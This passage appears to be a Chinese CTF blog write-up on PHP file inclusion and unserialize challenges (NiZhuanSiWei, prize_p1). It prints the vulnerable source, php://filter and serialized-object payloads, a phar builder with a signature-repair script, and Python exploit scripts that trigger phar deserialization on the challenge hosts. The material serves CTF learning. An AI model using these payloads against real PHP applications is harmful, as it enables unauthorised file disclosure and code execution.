title=\"文件包含和序列化综合\"></a>文件包含和序列化综合</h2><h3 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p> <a href=\"https://www.nssctf.cn/problem/22\">https://www.nssctf.cn/problem/22</a> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$text</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;text&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;file&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$text</span>)&amp;&amp;(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$text</span>,<span class=\"string\">&#x27;r&#x27;</span>)===<span class=\"string\">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$text</span>,<span class=\"string\">&#x27;r&#x27;</span>).<span class=\"string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/&quot;</span>,<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Not now!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        <span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$password</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>\n<p>base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span>(<span class=\"params\"></span>)</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br></pre></td></tr></table></figure>\n\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>\n<h2 id=\"phar反序列化和异常抛出绕过\"><a href=\"#phar反序列化和异常抛出绕过\" class=\"headerlink\" title=\"phar反序列化和异常抛出绕过\"></a>phar反序列化和异常抛出绕过</h2><h3 id=\"prize-p1\"><a href=\"#prize-p1\" class=\"headerlink\" title=\"prize_p1\"></a>prize_p1</h3><p>一个phar文件经过压缩之后，再用phar协议读取打开，也是可以正常执行的</p>\n<ol>\n<li>普通phar</li>\n<li>gzip</li>\n<li>bzip2</li>\n<li>tar</li>\n<li>zip</li>\n</ol>\n<p>一共就5中可以触发phar操作</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getflag</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$config</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;w&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;./tmp/a.txt&quot;</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;r&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"number\">0</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"><span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;那么就从这里开始起航吧&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h4><h5 id=\"第一部份\"><a href=\"#第一部份\" class=\"headerlink\" title=\"第一部份\"></a>第一部份</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$config</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;w&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;./tmp/a.txt&quot;</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;r&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一段可以看见当</p>\n<p>config&#x3D;w时是写入.&#x2F;tmp&#x2F;a.txt内容</p>\n<p>config&#x3D;r时是读取文件内容</p>\n<h5 id=\"第二部分\"><a href=\"#第二部分\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">throw</span> <span class=\"title\">new</span> <span class=\"title\">Error</span>(<span class=\"params\"><span class=\"string\">&quot;那么就从这里开始起航吧&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>__destruct和throw new Error的关系</p>\n<p>需要通过<strong>CG垃圾回收来绕过</strong></p>\n<h5 id=\"第三部分\"><a href=\"#第三部分\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getflag</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以通过这个<strong>getflag类来获取FLAG</strong></p>\n<p>代码审计整理思路得出</p>\n<p>先生成getflag类的phar文件，将phar文件中的序列化字符串进行修改绕过异常抛出</p>\n<p>但是，每一个<strong>phar文件都有相应的签名</strong>，<strong>直接修改会导制文件失效</strong>，所以还需要根据修改后的文件来<strong>修复签名</strong></p>\n<h4 id=\"生产phar文件-ph1-phar\"><a href=\"#生产phar文件-ph1-phar\" class=\"headerlink\" title=\"生产phar文件 ph1.phar\"></a>生产phar文件 ph1.phar</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getflag</span></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">getflag</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">array</span>(<span class=\"number\">0</span>=&gt;<span class=\"variable\">$a</span>,<span class=\"number\">1</span>=&gt;<span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;ph1.phar&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改ph1-phar文件中的序列化字符串绕过异常抛出\"><a href=\"#修改ph1-phar文件中的序列化字符串绕过异常抛出\" class=\"headerlink\" title=\"修改ph1.phar文件中的序列化字符串绕过异常抛出\"></a>修改ph1.phar文件中的序列化字符串绕过异常抛出</h4><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241028185615601.png\" alt=\"image-20241028185615601\"></p>\n<p>将倒数第二个1改为零</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241028185540520.png\" alt=\"image-20241028185540520\"></p>\n<h4 id=\"修复签名\"><a href=\"#修复签名\" class=\"headerlink\" title=\"修复签名\"></a>修复签名</h4><p>生成可用文件ph2.phar</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ph1.phar&quot;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    text = f.read()</span><br><span class=\"line\">    main = text[:-<span class=\"number\">40</span>]  <span class=\"comment\"># 正文部分(除去最后40字节)</span></span><br><span class=\"line\">    end = text[-<span class=\"number\">8</span>:]  <span class=\"comment\"># 最后八位也是不变的</span></span><br><span class=\"line\">    new_sign = sha256(main).digest()</span><br><span class=\"line\">    new_phar = main + new_sign + end</span><br><span class=\"line\">    <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ph2.phar&quot;</span>, <span class=\"string\">&#x27;wb&#x27;</span>).write(new_phar)  <span class=\"comment\"># 将新生成的内容以二进制方式覆盖写入原来的phar文件</span></span><br></pre></td></tr></table></figure>\n\n<p>一个phar文件经过压缩之后，再用phar协议读取打开，也是可以正常执行的</p>\n<ol>\n<li>普通phar</li>\n<li>gzip</li>\n<li>bzip2</li>\n<li>tar</li>\n<li>zip</li>\n</ol>\n<p>一共就5种可以触发phar操作</p>\n<p>上述任意一种方式来进行写入和读取</p>\n<h4 id=\"压缩绕过\"><a href=\"#压缩绕过\" class=\"headerlink\" title=\"压缩绕过\"></a>压缩绕过</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> gzip</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28723/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./ph2.phar&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>)  <span class=\"comment\"># 打开文件</span></span><br><span class=\"line\">file_out = gzip.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./phar.zip&quot;</span>, <span class=\"string\">&quot;wb+&quot;</span>)  <span class=\"comment\"># 创建压缩文件对象</span></span><br><span class=\"line\">file_out.writelines(file)</span><br><span class=\"line\">file_out.close()</span><br><span class=\"line\">file.close()</span><br><span class=\"line\"></span><br><span class=\"line\">requests.post(</span><br><span class=\"line\">    url,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./phar.zip&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)  <span class=\"comment\"># 写入</span></span><br><span class=\"line\"></span><br><span class=\"line\">res = requests.post(</span><br><span class=\"line\">    url,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"string\">&#x27;phar://tmp/a.txt&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)  <span class=\"comment\"># 触发</span></span><br><span class=\"line\">res.encoding = <span class=\"string\">&#x27;utf-8&#x27;</span></span><br><span class=\"line\">flag = re.<span class=\"built_in\">compile</span>(<span class=\"string\">&#x27;(NSSCTF\\&#123;.+?\\&#125;)&#x27;</span>).findall(res.text)[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"数组绕过\"><a href=\"#数组绕过\" class=\"headerlink\" title=\"数组绕过\"></a>数组绕过</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://node4.anna.nssctf.cn:28853/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 写入phar文件</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ph2.phar&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    data1=&#123;<span class=\"string\">&#x27;0[]&#x27;</span>:f.read()&#125;          <span class=\"comment\">#传数组绕过，值就是hacker1.phar文件的内容</span></span><br><span class=\"line\">    param1 = &#123;<span class=\"number\">0</span>: <span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span>&#125;</span><br><span class=\"line\">    res1 = requests.post(url=url, params=param1,data=data1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 读phar文件，获取flag</span></span><br><span class=\"line\">param2=&#123;<span class=\"number\">0</span>:<span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span>&#125;</span><br><span class=\"line\">data2=&#123;<span class=\"number\">0</span>:<span class=\"string\">&quot;phar://tmp/a.txt&quot;</span>&#125;</span><br><span class=\"line\">res2=requests.post(url=url,params=param2,data=data2)</span><br><span class=\"line\">flag=re.<span class=\"built_in\">compile</span>(<span class=\"string\">&#x27;NSSCTF\\&#123;.*?\\&#125;&#x27;</span>).findall(res2.text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"字符串逃逸\"><a href=\"#字符串逃逸\" class=\"headerlink\" title=\"字符串逃逸\"></a>字符串逃逸</h2><h3 id=\"prize-p5\"><a href=\"#prize-p5\" class=\"headerlink\" title=\"prize_p5\"></a>prize_p5</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">catalogue</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$class</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span 